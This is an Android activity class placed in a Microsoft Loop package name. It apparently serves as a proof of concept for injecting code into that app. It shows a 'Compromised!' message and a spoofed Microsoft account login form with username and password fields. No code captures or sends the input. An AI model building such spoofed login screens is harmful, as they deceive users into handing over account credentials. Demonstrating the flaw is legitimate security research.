package com.microsoft.loop.ui.activities;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Toast.makeText(this, "Compromised!", Toast.LENGTH_LONG).show();

        TextView textView = new TextView(this);
        textView.setText("Log into your Microsoft Account");
        textView.setTextAlignment(View.TEXT_ALIGNMENT_CENTER);
        EditText userName = new EditText(this);
        userName.setHint("User Name");
        EditText password = new EditText(this);
        password.setHint("Password");
        TextView legal = new TextView(this);
        legal.setText("\nAll your data is processed very securely!!!");
        legal.setTextAlignment(View.TEXT_ALIGNMENT_CENTER);
        Button loginButton = new Button(this);
        loginButton.setText("Login");
        loginButton.setTextAlignment(View.TEXT_ALIGNMENT_CENTER);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.addView(textView);
        layout.addView(userName);
        layout.addView(password);
        layout.addView(loginButton);
        layout.addView(legal);

        setContentView(layout);

        super.onCreate(savedInstanceState);
    }
}
